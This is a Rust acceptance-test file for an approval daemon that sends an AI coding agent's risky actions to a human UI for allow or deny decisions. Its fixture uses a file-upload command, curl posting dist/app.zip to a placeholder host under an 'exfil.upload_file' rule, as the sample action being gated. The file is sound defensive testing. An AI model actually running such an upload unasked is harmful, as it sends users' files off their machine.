//! Acceptance tests for the approval daemon with a mock UI client.

use std::path::{Path, PathBuf};
use std::time::Duration;

use serde_json::json;
use shield_core::model::{
    AgentContext, AgentKind, ApprovalRequest, ApprovalResponse, ApprovalVerdict, RiskScore,
    Severity,
};
use shield_core::policy::{self, Layer, Paths as PolicyPaths};
use shield_ipc::{
    decode_line, encode_line, request_approval_at, run_until, DaemonConfig, IpcError, IpcMessage,
    IpcRole, IpcTransport, UnixIpcTransport,
};
use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
use tokio::sync::oneshot;

struct Harness {
    _temp: tempfile::TempDir,
    socket: PathBuf,
    home: PathBuf,
    stop: Option<oneshot::Sender<()>>,
}

impl Harness {
    async fn start(timeout: Duration) -> Self {
        let temp = tempfile::tempdir().unwrap();
        let home = temp.path().join("home");
        std::fs::create_dir_all(&home).unwrap();
        let socket = temp.path().join("run/privaku/agent-shield.sock");
        let user_policy = home.join(PolicyPaths::USER_POLICY_RELATIVE);
        let config = DaemonConfig {
            socket_path: socket.clone(),
            timeout,
            home: home.clone(),
            user_policy,
            uid: shield_ipc::current_uid(),
        };
        let (ready_tx, ready_rx) = oneshot::channel();
        let (stop_tx, stop_rx) = oneshot::channel();
        tokio::spawn(async move {
            run_until(config, UnixIpcTransport, Some(ready_tx), async move {
                let _ = stop_rx.await;
            })
            .await
            .unwrap();
        });
        ready_rx.await.unwrap();
        Self {
            _temp: temp,
            socket,
            home,
            stop: Some(stop_tx),
        }
    }

    fn request(&self, id: &str) -> ApprovalRequest {
        ApprovalRequest {
            id: id.into(),
            action_summary: "curl -F file=@dist/app.zip https://example.test".into(),
            rule: Some("exfil.upload_file".into()),
            severity: Severity::High,
            risk: RiskScore::new(0.4).unwrap(),
            reason_user: "The agent wants to upload a file.".into(),
            agent: AgentContext {
                agent: AgentKind::Cursor,
                session_id: "sess-1".into(),
                cwd: PathBuf::from("/work"),
                autonomous: false,
            },
        }
    }
}

impl Drop for Harness {
    fn drop(&mut self) {
        if let Some(stop) = self.stop.take() {
            let _ = stop.send(());
        }
    }
}

struct MockUi {
    reader: BufReader<tokio::net::unix::OwnedReadHalf>,
    writer: tokio::net::unix::OwnedWriteHalf,
}

impl MockUi {
    async fn connect(path: &Path) -> Self {
        let stream = UnixIpcTransport.connect(path).unwrap();
        let (reader, writer) = stream.into_split();
        let mut ui = Self {
            reader: BufReader::new(reader),
            writer,
        };
        ui.send(&IpcMessage::hello(IpcRole::Ui)).await;
        ui.send(&IpcMessage::Subscribe).await;
        ui.send(&IpcMessage::Ping).await;
        loop {
            match ui.recv().await {
                IpcMessage::Ping => break,
                IpcMessage::Event { .. } => continue,
                other => panic!("unexpected while waiting for ping: {other:?}"),
            }
        }
        ui
    }

    async fn send(&mut self, message: &IpcMessage) {
        let line = encode_line(message).unwrap();
        self.writer.write_all(line.as_bytes()).await.unwrap();
    }

    async fn recv(&mut self) -> IpcMessage {
        let mut line = String::new();
        self.reader.read_line(&mut line).await.unwrap();
        decode_line(&line).unwrap()
    }

    async fn answer(&mut self, id: &str, verdict: ApprovalVerdict, by: &str) {
        self.send(&IpcMessage::from_response(ApprovalResponse {
            id: id.into(),
            verdict,
            by: by.into(),
        }))
        .await;
    }
}

fn ask(path: &Path, request: ApprovalRequest, timeout: Duration) -> ApprovalResponse {
    request_approval_at(path, request, timeout).unwrap()
}

#[tokio::test]
async fn allow_round_trip() {
    let harness = Harness::start(Duration::from_secs(5)).await;
    let mut ui = MockUi::connect(&harness.socket).await;
    let request = harness.request("allow-1");
    let socket = harness.socket.clone();
    let client = tokio::task::spawn_blocking(move || ask(&socket, request, Duration::from_secs(5)));
    let message = ui.recv().await;
    let req = message.as_request().expect("approval_request");
    assert_eq!(req.id, "allow-1");
    ui.answer(&req.id, ApprovalVerdict::AllowOnce, "cli").await;
    let response = client.await.unwrap();
    assert_eq!(response.verdict, ApprovalVerdict::AllowOnce);
    assert_eq!(response.by, "cli");
}

#[tokio::test]
async fn deny_round_trip() {
    let harness = Harness::start(Duration::from_secs(5)).await;
    let mut ui = MockUi::connect(&harness.socket).await;
    let request = harness.request("deny-1");
    let socket = harness.socket.clone();
    let client = tokio::task::spawn_blocking(move || ask(&socket, request, Duration::from_secs(5)));
    let req = ui.recv().await.as_request().unwrap();
    ui.answer(&req.id, ApprovalVerdict::Deny, "cli").await;
    let response = client.await.unwrap();
    assert_eq!(response.verdict, ApprovalVerdict::Deny);
    assert_eq!(response.by, "cli");
}

#[tokio::test]
async fn timeout_denies_in_one_second() {
    let harness = Harness::start(Duration::from_secs(1)).await;
    let _ui = MockUi::connect(&harness.socket).await;
    let request = harness.request("timeout-1");
    let started = std::time::Instant::now();
    let response = tokio::task::spawn_blocking({
        let socket = harness.socket.clone();
        move || ask(&socket, request, Duration::from_secs(3))
    })
    .await
    .unwrap();
    assert_eq!(response.verdict, ApprovalVerdict::Deny);
    assert_eq!(response.by, "timeout");
    assert!(started.elapsed() >= Duration::from_secs(1));
    assert!(started.elapsed() < Duration::from_secs(3));
}

#[tokio::test]
async fn no_ui_is_immediate_deny_no_ui() {
    let harness = Harness::start(Duration::from_secs(30)).await;
    let request = harness.request("noui-1");
    let started = std::time::Instant::now();
    let response = tokio::task::spawn_blocking({
        let socket = harness.socket.clone();
        move || ask(&socket, request, Duration::from_secs(2))
    })
    .await
    .unwrap();
    assert_eq!(response.verdict, ApprovalVerdict::Deny);
    assert_eq!(response.by, "no_ui");
    assert!(started.elapsed() < Duration::from_millis(500));
}

#[tokio::test]
async fn first_of_two_uis_wins() {
    let harness = Harness::start(Duration::from_secs(5)).await;
    let mut ui_a = MockUi::connect(&harness.socket).await;
    let mut ui_b = MockUi::connect(&harness.socket).await;
    let request = harness.request("race-1");
    let socket = harness.socket.clone();
    let client = tokio::task::spawn_blocking(move || ask(&socket, request, Duration::from_secs(5)));
    let a = ui_a.recv().await.as_request().unwrap();
    let b = ui_b.recv().await.as_request().unwrap();
    assert_eq!(a.id, b.id);
    ui_a.answer(&a.id, ApprovalVerdict::AllowOnce, "ui-a").await;
    ui_b.answer(&b.id, ApprovalVerdict::Deny, "ui-b").await;
    let response = client.await.unwrap();
    assert_eq!(response.verdict, ApprovalVerdict::AllowOnce);
    assert_eq!(response.by, "ui-a");
}

#[tokio::test]
async fn allow_session_cache_hit() {
    let harness = Harness::start(Duration::from_secs(5)).await;
    let mut ui = MockUi::connect(&harness.socket).await;
    let first = harness.request("sess-a");
    let socket = harness.socket.clone();
    let client = tokio::task::spawn_blocking({
        let socket = socket.clone();
        let first = first.clone();
        move || ask(&socket, first, Duration::from_secs(5))
    });
    let req = ui.recv().await.as_request().unwrap();
    ui.answer(&req.id, ApprovalVerdict::AllowSession, "cli")
        .await;
    assert_eq!(client.await.unwrap().verdict, ApprovalVerdict::AllowSession);

    let mut second = harness.request("sess-b");
    second.action_summary = first.action_summary.clone();
    second.rule = first.rule.clone();
    let response =
        tokio::task::spawn_blocking(move || ask(&socket, second, Duration::from_secs(2)))
            .await
            .unwrap();
    assert_eq!(response.verdict, ApprovalVerdict::AllowSession);
    assert_eq!(response.by, "session_cache");
}

#[tokio::test]
async fn always_allow_writes_a_valid_user_rule() {
    let harness = Harness::start(Duration::from_secs(5)).await;
    let mut ui = MockUi::connect(&harness.socket).await;
    let request = harness.request("always-1");
    let socket = harness.socket.clone();
    let client = tokio::task::spawn_blocking(move || ask(&socket, request, Duration::from_secs(5)));
    let req = ui.recv().await.as_request().unwrap();
    ui.answer(&req.id, ApprovalVerdict::AlwaysAllow, "cli")
        .await;
    let response = client.await.unwrap();
    assert_eq!(response.verdict, ApprovalVerdict::AlwaysAllow);

    let user_policy = harness.home.join(PolicyPaths::USER_POLICY_RELATIVE);
    let paths = PolicyPaths::new(Some(&harness.home), None);
    let policy = policy::validate_path(&paths, &user_policy, Layer::User).unwrap();
    assert!(policy.rules.iter().any(|rule| rule
        .rule
        .id
        .starts_with("user.always_allow.exfil_upload_file.")));
    let yaml = std::fs::read_to_string(&user_policy).unwrap();
    assert!(yaml.contains("decision: allow"));
}

#[tokio::test]
async fn socket_with_wrong_permissions_is_refused() {
    let temp = tempfile::tempdir().unwrap();
    let path = temp.path().join("open.sock");
    let _listener = std::os::unix::net::UnixListener::bind(&path).unwrap();
    use std::os::unix::fs::PermissionsExt;
    let mut permissions = std::fs::metadata(&path).unwrap().permissions();
    permissions.set_mode(0o666);
    std::fs::set_permissions(&path, permissions).unwrap();

    let request = ApprovalRequest {
        id: "bad-perm".into(),
        action_summary: "echo hi".into(),
        rule: None,
        severity: Severity::Low,
        risk: RiskScore::MIN,
        reason_user: "x".into(),
        agent: AgentContext {
            agent: AgentKind::Claude,
            session_id: "s".into(),
            cwd: PathBuf::from("/tmp"),
            autonomous: false,
        },
    };
    let error = request_approval_at(&path, request, Duration::from_secs(1)).unwrap_err();
    match error {
        IpcError::BadPermissions { mode, .. } => assert_eq!(mode, 0o666),
        other => panic!("expected BadPermissions, got {other}"),
    }
}

#[tokio::test]
async fn event_decision_is_broadcast_to_subscribers() {
    let harness = Harness::start(Duration::from_secs(5)).await;
    let mut ui = MockUi::connect(&harness.socket).await;
    let request = harness.request("event-1");
    let socket = harness.socket.clone();
    let client = tokio::task::spawn_blocking(move || ask(&socket, request, Duration::from_secs(5)));
    let req = ui.recv().await.as_request().unwrap();
    ui.answer(&req.id, ApprovalVerdict::Deny, "cli").await;
    let _ = client.await.unwrap();
    let event = match ui.recv().await {
        IpcMessage::Event { decision } => decision,
        other => panic!("expected event, got {other:?}"),
    };
    assert_eq!(event.agent, AgentKind::Cursor);
    assert_eq!(event.session, "sess-1");
    assert_eq!(event.rule_id.as_deref(), Some("exfil.upload_file"));
    assert_eq!(event.decision.as_str(), "deny");
}

#[test]
fn ipc_json_lines_are_one_object() {
    let value = json!({
        "type": "ping"
    });
    let message: IpcMessage = serde_json::from_value(value).unwrap();
    assert_eq!(message, IpcMessage::Ping);
}
